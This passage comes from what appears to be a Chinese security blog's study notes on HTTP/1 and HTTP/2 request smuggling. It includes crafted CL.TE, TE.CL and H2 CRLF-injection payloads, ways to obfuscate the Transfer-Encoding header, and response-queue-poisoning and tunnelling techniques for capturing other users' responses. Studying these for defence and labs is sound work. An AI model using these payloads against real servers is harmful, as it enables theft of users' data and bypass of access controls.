class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> bar</span><br></code></pre></td></tr></table></figure><h3 id="HTTP-2专属向量"><a href="#HTTP-2专属向量" class="headerlink" title="HTTP&#x2F;2专属向量"></a>HTTP&#x2F;2专属向量</h3><blockquote><p>即使网站采取措施防止基本的 H2.CL 或 H2.TE 攻击，例如验证<code>content-length</code>或剥离任何<code>transfer-encoding</code>标头，HTTP&#x2F;2 的二进制格式也使得绕过这些前端措施成为可能。</p></blockquote><ul><li><p>注射CRLF进行走私</p><ul><li><p>Header值注入</p><p>（实验2）</p><p>H1：中可以利用<code>\n</code>的前后端解析差异偷偷发送Header，例如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>bar\nTransfer-Encoding: chunked<br></code></pre></td></tr></table></figure><p>这里前端以为是<code>Foo</code>标头，而后端解析为<code>Foo</code>以及<code>TE</code>两个</p><p>H2:  在二进制不靠<code>\r\n</code>而是靠偏移量</p><table><thead><tr><th>foo</th><th>bar\r\nTransfer-Encoding: chunked</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这样在重写降级中就会解析为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>bar<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br></code></pre></td></tr></table></figure><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102191238919.png" alt="image-20251102191238919"></p></li><li><p>Header名称注入</p><p>上面CRLF是通过在H2的标头的值里面注入回车，而这个是在键里面注入回车，</p><table><thead><tr><th>foo: bar\r\nTransfer-Encoding: chunked\r\nX:</th><th>ignore</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>后端解析：<strong>后端（HTTP&#x2F;1）</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>bar\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br><span class="hljs-attribute">X</span><span class="hljs-punctuation">: </span>ignore\r\n<br></code></pre></td></tr></table></figure></li></ul></li><li><p>伪头部注入</p><p>这里所谓的伪头部就是</p><ul><li><code>:method</code>- 请求方法。</li><li><code>:path</code>- 请求路径。请注意，这包括查询字符串。</li><li><code>:authority</code>- 与 HTTP&#x2F;1<code>Host</code>标头大致相同。</li><li><code>:scheme</code>- 请求方案，通常<code>http</code>或<code>https</code>。</li><li><code>:status</code>- 响应状态码（请求中未使用）。</li></ul><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102193100208.png" alt="image-20251102193100208"></p><p>这个总结一下，就是针对每个伪标头，尝试 Host攻击，模糊path绕过访问控制，用method构造模糊路径，schema覆盖造成host攻击（令schema变成<code>https://evil-user.net/poison?</code>，最终拼接可能location：<code>https://evil-user.net/poison?://authority</code>），或者在伪头插入换行</p></li></ul><h2 id="高级利用："><a href="#高级利用：" class="headerlink" title="高级利用："></a>高级利用：</h2><h3 id="1-响应队列投毒"><a href="#1-响应队列投毒" class="headerlink" title="1. 响应队列投毒"></a>1. 响应队列投毒</h3><p>（见实验3）</p><p>​<strong>原理</strong>简单来说，就是构造魔改包时，让走私部分是一个完整的请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http">POST / HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com\r\n<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>x-www-form-urlencoded\r\n<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>61\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br>\r\n<br>0\r\n<br>\r\n<br>GET /anything HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>​这样，前端发过去后，后端会解析出两个请求，也就会返回两个响应。</p><p>​但前端只有一个等待响应，所以我们走私的响应就会卡在这里</p><p>​<img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102211528368.png" alt="image-20251102211528368"></p><p>​同一个TCP上，等下一个人发请求时，就会收到走私的请求，而他的请求也会卡在队列中，</p><p>​这样每个人都会收到上一个人的请求，也就是响应队列污染：见图</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102211727384.png" alt="image-20251102211727384"></p><p>​在<strong>攻击</strong>时，为了更容易区分窃取的响应和对您自身请求的响应，请尝试在您发送的两个请求中使用不存在的路径。这样，例如，您自身的请求应该始终收到 404 响应。这样很容易区分出他人的响应。</p><p>​这个攻击<strong>影响</strong>很大，不仅会泄露受害者敏感信息，还会导致整条TCP连接流浪错位而无法使用</p><h3 id="2-HTTP-2-请求拆分（队列投毒）"><a href="#2-HTTP-2-请求拆分（队列投毒）" class="headerlink" title="2. HTTP&#x2F;2 请求拆分（队列投毒）"></a>2. HTTP&#x2F;2 请求拆分（队列投毒）</h3><p>（实验4）</p><p>在上面的响应队列投毒中，我们通过魔改包将一个请求拆分为两个请求，这个拆分过程是在<code>body</code>里；</p><p>而有一种更<strong>灵活</strong>的方式，就是当启用 HTTP&#x2F;2 降级时，在请求Header中实现这种拆分</p><p>其实就是利用<code>CRLF</code>注入，在Header中走私。 如果我们动不了什么手脚，改不了CL，而后端是CL解析时这个方法就顺便完成了绕过（此时因为不在body注入，所以CL&#x3D;0）</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102213238913.png" alt="image-20251102213238913"></p><p><strong>！！考虑前端重写</strong></p><p>小细节，例如：H2在降级翻译的时候<code>authority</code>是翻译成<code>Host</code>的，并且一些前端会将新的<code>Host</code>头部信息添加到当前头部列表的末尾。</p><p>所以我们得给翻译部分补上一个HOST，并空出走私部分的HOST。（那其实为了保险，上下都写一遍就行了 ）</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102214330911.png" alt="image-20251102214330911"></p><p>提一下 这个方法是通用的 ，我们既可以构造相应队列投毒，也可以走私拼接，引导受害者访问我们的请求包</p><h3 id="3-HTTP请求隧道（非走私）"><a href="#3-HTTP请求隧道（非走私）" class="headerlink" title="3. HTTP请求隧道（非走私）"></a>3. HTTP请求隧道（非走私）</h3><p>至此，我们介绍的请求走私攻击都有一个前提：前端服务器与后端服务器之间的相同连接用于处理多个请求。下面就讲讲即使不重用连接的攻击手段。<br>当服务器只允许来自同一IP或同一客户端的请求重用连接，其他人根本不会重用连接。这时就没有明显的办法去影响其他用户的流量。尽管攻击面被缩小了，但仍然能做出一些危险的行为。以下介绍泄露请求头和web缓存投毒。但是再次之前，先讲讲如何确认请求非同步隧道的存在。</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102235354366.png" alt="image-20251102235354366"></p><p>总的来看HTTP请求走私无非就是三个作用，一个能巧妙绕过前端的一些障碍，一个是强迫受害者被我们的魔改包带着走（请求包被我们控制），一个是响应队列投毒获取敏感信息</p><p>下面就讲讲即使不重用连接的攻击手段。<strong>请求隧道攻击</strong>就是攻击者把任意非 HTTP 的流量（或其它协议&#x2F;命令与数据）封装在看起来像合法的 HTTP 请求或响应里，通过允许 HTTP 的通道（比如 Web 代理、HTTP 端口、企业防火墙）在受限网络中传输这些数据，从而绕过策略限制、建立 C2 通道或实现数据外泄。</p><ul><li><p><strong>请求隧道泄露内部Header</strong>（看新加的请求头）</p><p>在H1的揭露重写Header中，我们用请求走私，把同一TCP上的受害者的请求包通过能反射的参数带出来了。但当服务器严格限制TCP链接机制的时候，H2降级的翻译环节给了机会（不是传统的魔改成两个包，而是精心构造一个包带出数据）</p><p>构造一个无用Header，使得H2翻译成H1的过程中，前端会将我们注入的内容视为请求头的一部分，因此会在末尾<code>comment=</code>字符串之后添加新的请求头。到后端则会将该<code>\r\n\r\n</code>视为请求头的结尾。该<code>comment=</code>字符串及其内部请求头会被视为请求体的一部分。最终会生成一个<code>comment</code>参数，其值即为内部请求头。</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251103004853840.png" alt="image-20251103004853840"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>200<br><br><span class="language-ini"><span class="hljs-attr">comment</span>=X-Internal-Header: secretContent-Length: <span class="hljs-number">3</span></span><br><span class="language-ini"><span class="hljs-attr">x</span>=<span class="hljs-number">1</span></span><br><span class="language-ini"></span><br></code></pre></td></tr></table></figure></li><li><p><strong>用<code>Head</code>进行非盲请求隧道传输</strong>（看响应的BODY）</p><p>（实验5）</p><p>前端在接后端响应时有两种常见策略：</p><ul><li><strong>读取并转发全部后端发来的字节</strong> → 你可能会在主响应体里看到“嵌套的”被隧道请求的响应（可见的隧道）；</li><li><strong>只读 Content-Length 指定的字节后停止读取</strong> → 剩余字节保留在 front↔back 的连接上（队列里），你看不到（盲隧道）。</li></ul><p>可以用<code>HEAD</code>请求使这些漏洞不再是盲请求。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http">:method HEAD<br>:path   /example<br>:authority  vulnerable-website.com<br>foo <br>    bar\r\n<br>    \r\n<br>    GET /tunnelled HTTP/1.1\r\n<br>    Host: vulnerable-website.com\r\n<br>    X: x<br></code></pre></td></tr></table></figure><p>HEAD请求方式就是<strong>仅返回响应头，无响应体</strong>的GET，而请求头中肯定有一个<code>content-length</code>头，如果中间件信任了这个CL去读取隧道里的字节，就会部分可见第二个请求包</p><p>要成功利用，需要把两边（HEAD 的 CL 与 tunnelled response 的长度）“对齐”到一个能让你看到有用数据但不导致明显阻塞的状态 —— 这就是“平衡”。CL长了会等不到相应导致阻塞，CL短了会导致信息看不全。这里是一些办法：</p><ul><li>将<code>HEAD</code>请求指向不同的端点，根据需要返回更长或更短的资源。</li><li>如果某个页面能反射输入，调整输入即可</li><li>若HEAD请求的CL过长，那我们隧道请求中使用反射输入来注入任意字符，是队列中的响应更长</li></ul></li><li><p><strong>请求隧道进行 Web 缓存投毒</strong></p><p>(实验6)</p><p>其实可以想到，因为没有和受害者同一个隧道的协助，我们想攻击只能借助其他手段，例如Caceh投毒。</p><p>非盲隧道技术将一个响应的头部信息与另一个响应的主体信息混合搭配。如果响应主体中包含未编码的用户输入，您或许可以利用这种特性，在浏览器通常不会执行代码的情况下，进行反射型 XSS 攻击。（通常找目录下解析js文件的目录）</p><p>通常去找响应的<code>content-type</code>是<code>text/html</code>，在找一个响应body能直接反射xss而不编码的（HEAD法混合）</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251104135642593.png" alt="image-20251104135642593"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP1请求走私</title>
    <link href="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<p><em>HTTP Request Smuggling（HTTP 请求走私）漏洞在实战中关注的比较少，但这种冷门的漏洞也可造成较大的影响（绕WAF等），通过本文对HTTP 请求走私的大起底，在平时的工作中多关注这方面的漏洞检测及利用。</em></p><h1 id="HTTP-Smuggling"><a href="#HTTP-Smuggling" class="headerlink" title="HTTP Smuggling"></a>HTTP Smuggling</h1><h2 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h2><ul><li><p>CL（Content-Length）：HTTP协议中的一个消息头（header），它用于指定HTTP请求或响应中消息体的大小，以便接收方能够正确地接收和处理消息。需要注意的是，在使用Content-Length时，消息体的长度必须要精确指定，否则接收方可能会出现错误。而在某些情况下，由于消息体的大小无法确定，比如在使用分块传输（chunked）的情况下，就需要使用Transfer-Encoding头来指定消息体的编码方式，而不是使用Content-Length来指定消息体的大小</p></li><li><p>TE（Transfer-Encoding）：一种传输编码方式，它用于在传输过程中对消息体进行编码，以便在传输过程中对消息体进行压缩或分块传输等操作。当服务器无法确定响应的大小时，如动态生成的响应或者通过流式传输时，可以使用Transfer-Encoding来实现分块传输（0就是截断）</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>4<br>Wiki<br>a<br>abcdefghik<br>0<br><br></code></pre></td></tr></table></figure></li><li><p>关于HTTP1.1：这个版本默认开始了<code>Connection: Keep-alive</code>特性，作用是告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度.。且一个请求用了<code>TE</code>就不能用<code>CL</code>（RFC规范的TE优先级更高，同时存在选TE或者直接报错）</p></li><li><p>TE的解析，最后一个<code>0</code>后面又有两个<code>\r\n</code></p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101174609570.png"></p></li><li><p>再解释一下真正确认漏洞时，更加困难，要确保采用不同TCP连接，因为有些中间件会把不同请求路由到不同后端主机或连接</p></li></ul><h2 id="2-成因"><a href="#2-成因" class="headerlink" title="2.成因"></a>2.成因</h2><pre><code class="hljs">1. 和Web Cache漏洞以及很多细节漏洞的产生原理一样，请求走私大多发生于**前端服务器**和**后端服务器**对客户端传入的数据理解不一致的情况。2. 当前端或中间件将 HTTP 请求转发到后端服务器时，通常会通过同一个后端网络连接发送多个请求，因为这样效率更高，性能更好。</code></pre><ul><li><p>经典的请求走私攻击是指将<code>Content-Length</code>请求头和<code>Transfer-Encoding</code> 响应头都放在同一个 HTTP&#x2F;1 请求中，并操纵这些请求头，是的例如后端对于第一个包产生了截断，前者正常处理，后者就会和第二个包进行拼接，这样就对第二个包造成了影响，详细看下下面这张图。</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031204354811.png"></p></li></ul><p>​这里注意 对请求走私进行测试时，要把BP的自动更新CL取消</p><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031212459776.png"></p><h2 id="3-类型"><a href="#3-类型" class="headerlink" title="3.类型"></a>3.类型</h2><h3 id="CL-TE："><a href="#CL-TE：" class="headerlink" title="CL.TE："></a>CL.TE：</h3><p>​（可见实验1）</p><ul><li><p>CL.TE：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</p><p>构造请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">POST / HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com\r\n<br>...<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive\r\n<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br>\r\n<br>0\r\n<br>\r\n<br>a<br></code></pre></td></tr></table></figure><ul><li>前端依据<code>CL</code>截取到<code>a</code>(即所有),</li></ul></li><li><p>后端依据<code>chunked</code>截取到<code>0</code>,</p><ul><li>后面的部分<code>a</code>就会和下一个包拼接为下一个请求</li></ul></li></ul><h3 id="TE-CL："><a href="#TE-CL：" class="headerlink" title="TE.CL："></a>TE.CL：</h3><p>​（可见实验2）</p><ul><li><p>TE.CL：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</p><p>构造请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http">POST / HTTP/1.1\r\n<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com\r\n<br>...<br><span class="hljs-attribute">Content-length</span><span class="hljs-punctuation">: </span>4\r\n<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked\r\n<br>\r\n<br>5c\r\n             //chunked的字节数不包含内容的最后的换行,且是HEX<br>aPOST / HTTP/1.1\r\n<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded\r\n<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5+1\r\n    //CL的字节数不包含第一个换行<br>\r\n<br>0\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><ul><li>前端依据<code>TE</code>把所有部分上传到后端</li><li>后端依据<code>CL</code>只留下<code>5c\r\n</code>,后面的部分被分到下一个包</li><li>后面的部分中,有一个内层CL,+1就会让这一块再等一个字节(等下一个请求中)</li><li>就达成了毁掉下一个请求, (产生三个包,一个是构造,一个是拼接后的aPOST,一个是被截取首字母的原正常请求；但请求会缩成两个，这样我们访问正常包才会看到走私的结果)</li></ul></li><li><p>这里不用标头法覆盖(yjh:a)是因为后面有个换行0，是要再魔改请求里当做了body，所以必须带上CL</p></li></ul><h3 id="TE-TE："><a href="#TE-TE：" class="headerlink" title="TE.TE："></a>TE.TE：</h3><p>​（可见实验3）</p><ul><li><p>TE.TE：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</p><p>混淆TE头的几个方式</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>xchunked<br><br>Transfer-Encoding : chunked      #前后空格 <br><br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br><span class="hljs-attribute">X</span><span class="hljs-punctuation">: </span>X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>最后就是呈现成CL.TE或者TE.CL。</p></li></ul><h2 id="4-漏洞检测"><a href="#4-漏洞检测" class="headerlink" title="4.漏洞检测"></a>4.漏洞检测</h2><p>​<strong>注意有一个点不要混淆</strong>，拼接的思路是前端送进去所有，后端在中间就截断，导致被截下来的部分留到下一个请求包； 但测试的时候是前端送进去的数据会导致后端数据无法完成闭合而一直等待，导致超时，就算你后面跟上一个请求也不会把测试包拼完整。</p><p>​# 计时技术</p><ul><li><p>利用计时技术发现CL.TE漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><br><span class="language-css"><span class="hljs-number">1</span></span><br><span class="language-css"><span class="hljs-selector-tag">A</span></span><br><span class="language-css"><span class="hljs-attribute">X</span></span><br></code></pre></td></tr></table></figure><p>让正文长度大于CL长度，此时前端仅收录一部分，后端因为采用TE处理，要一直等待后续请求包，直到完整的一块才终止</p></li><li><p>利用计时技术发现TE.CL漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6<br><br><span class="language-css"><span class="hljs-number">0</span></span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-attribute">X</span>\<span class="hljs-attribute">r</span>\n</span><br><span class="language-css">\<span class="hljs-attribute">r</span>\n</span><br></code></pre></td></tr></table></figure><p>前端处理TE，但开始就遇到<code>0\r\n\r\n</code>（表示结束），直接丢弃X发给后端，后端用CL，要6个字节长度内容才会终止，等不到就一直等，直到响应超时</p></li></ul><p>值得注意的是如果应用程序可能受到CL.TE攻击，那么针对TE.CL漏洞的利用计时技术的测试可能会干扰其他应用程序用户。因此，要保持隐蔽并最大程度地减少超时现象，应该首先使用CL.TE测试，只有在第一次测试不成功时才继续进行TE.CL测试。</p><p>​# 确认漏洞</p><p>​连续快速的发送两次请求，第一个是魔改的请求包，第二个是正常的请求，这样就能用第一个请求干扰后端服务器对第二个请求包的处理</p><ul><li><h3 id="使用差异响应确认-CL-TE-漏洞"><a href="#使用差异响应确认-CL-TE-漏洞" class="headerlink" title="使用差异响应确认 CL.TE 漏洞"></a>使用差异响应确认 CL.TE 漏洞</h3><p>（可见实验4）</p><p>发送</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>49<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-routeros">e</span><br><span class="language-routeros"><span class="hljs-attribute">q</span>=smuggling&amp;x=</span><br><span class="language-routeros">0</span><br><span class="language-routeros"></span><br><span class="language-routeros"><span class="hljs-built_in">GET</span> /404 HTTP/1.1</span><br><span class="language-routeros">Foo: x</span><br></code></pre></td></tr></table></figure><p>如果攻击成功，后端服务器会将此请求的最后两行视为下一个收到的请求。这将导致后续的“正常”请求看起来像这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>xPOST /search HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-abnf"><span class="hljs-attribute">q</span><span class="hljs-operator">=</span>smuggling</span><br></code></pre></td></tr></table></figure><p>由于此请求现在包含无效的 URL，服务器将以状态码 404 进行响应，表明攻击请求确实干扰了服务器。</p></li><li><h3 id="使用差异响应确认-TE-CL-漏洞"><a href="#使用差异响应确认-TE-CL-漏洞" class="headerlink" title="使用差异响应确认 TE.CL 漏洞"></a>使用差异响应确认 TE.CL 漏洞</h3><p>（可见实验5）</p><p>要确认 TE.CL 是否存在漏洞，您可以发送如下攻击请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">7</span>c</span><br><span class="language-nix">GET <span class="hljs-symbol">/404</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">144</span>（<span class="hljs-operator">&gt;</span>内层body字节数即可）</span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><p>如果攻击成功，<code>GET /404</code>后端服务器会将之后的所有内容都视为下一个收到的请求。这将导致后续的“正常”请求看起来像这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>146<br><br><span class="language-nix">x<span class="hljs-operator">=</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">POST <span class="hljs-symbol">/search</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span 